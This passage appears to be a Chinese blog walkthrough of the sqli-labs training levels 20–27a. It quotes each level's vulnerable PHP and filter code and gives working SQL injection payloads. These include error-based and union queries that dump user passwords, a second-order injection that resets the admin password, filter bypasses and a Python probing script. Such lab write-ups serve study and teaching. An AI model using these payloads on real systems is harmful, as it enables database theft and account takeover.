+<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>或者</p>
+<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
+<br>
+
+<br>
+
+<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>
+
+<p>和20关相比，多了base64编码 ，这个使用<code>&#39;)</code>闭合</p>
+<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64一下</p>
+<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
+<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><code>&quot;</code>闭合，其余和21相同</p>
+<br>
+
+<h3 id="23-被过滤-单引号闭合-报错注入"><a href="#23-被过滤-单引号闭合-报错注入" class="headerlink" title="23 #```-- 被过滤 单引号闭合 报错注入"></a>23 <code>#```-- </code>被过滤 单引号闭合 报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>#</code>和<code>-- </code>被过滤了 使用<code>&#39;</code>闭合</p>
+<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
+<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>无法通过这种方式判断字段数</p>
+<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>报错</p>
+<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>不报错</p>
+<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>报错</p>
+<p>可以判断有三个字段，2，3是回显点，但是3处输出结果只有0和1，估计是布尔型，所以把2当作输出点</p>
+<p>当然这里亦可以使用报错注入，相对简单点</p>
+<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
+<br>
+
+<br>
+
+<h3 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24 二次注入"></a>24 二次注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , time()<span class="number">-3600</span>);</span><br><span class="line">    header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>update</code>在修改密码时，<code>$username</code>直接获取session 并没有做任何过滤处理</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    header(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当成功登录时，<code>$_SESSION[&quot;username&quot;]</code>直接取出使用，并没有过滤，所以这里的<code>$username</code>是可控变量</p>
+<br>
+
+<br>
+
+<p>先注册一个<code>admin&#39;# </code>账号 随便设置一个密码<code>123456</code>，登录后修改密码为<code>12345</code></p>
+<p>使用<code>admin</code> 再次登录发现原密码<code>admin</code>被改成<code>12345</code></p>
+<br>
+
+<h3 id="25-or-and被过滤"><a href="#25-or-and被过滤" class="headerlink" title="25 or and被过滤"></a>25 <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据图片提示，<code>or</code>和<code>and</code>被过滤了  使用<code>&#39;</code>闭合</p>
+<p><code>?id=1&#39; --+</code></p>
+<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3为输出点</p>
+<p>或者 <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
+<p>虽然被过滤掉了，但可以使用双写绕过</p>
+<br>
+
+<h3 id="25a-or-and被过滤"><a href="#25a-or-and被过滤" class="headerlink" title="25a or and被过滤"></a>25a <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>和25相比 少了<code>&#39;</code></p>
+<p><code>?id=1 oorrder by 3</code></p>
+<p><code>?id=0 union select 1,database(),3</code></p>
+<br>
+
+<h3 id="26-or-and-空格和斜杠被过滤"><a href="#26-or-and-空格和斜杠被过滤" class="headerlink" title="26 or/and/*/-/#/空格和斜杠被过滤"></a>26 <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>
+
+<p><code>%20(空格)、%23(#)、%2a(*)、%2d(-)、%2f(/)、%5c(\)，%09-%0d都是制表符、换行符、换页符</code></p>
+<p>但是这个题在linux环境下可以解析<code>%a0</code>windows下就无法解析</p>
+<p>这一关有三种注入方式:</p>
+<ul>
+<li>union select 联合注入，用特殊编码符代替空格</li>
+<li>报错注入，为了避开空格，选择使用<code>updatexml()</code>和<code>extractvalue()</code></li>
+<li>Bool盲注，构造避开空格的语句</li>
+</ul>
+<p>使用<code>||</code>替换<code>and</code></p>
+<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
+<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
+<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
+<br>
+
+<h3 id="26a-or-and-空格和斜杠被过滤"><a href="#26a-or-and-空格和斜杠被过滤" class="headerlink" title="26a  or/and/*/-/#/空格和斜杠被过滤"></a>26a  <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
+<br>
+
+<br>
+
+<h3 id="27-空格-union-select被过滤"><a href="#27-空格-union-select被过滤" class="headerlink" title="27 */-/#/空格/*/union/select被过滤"></a>27 <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
+<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
+<br>
+
+<br>
+
+<h3 id="27a-空格-union-select被过滤"><a href="#27a-空格-union-select被过滤" class="headerlink" title="27a */-/#/空格/*/union/select被过滤"></a>27a <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> 双引号闭合</p>
+<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
+<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
+<br>
+
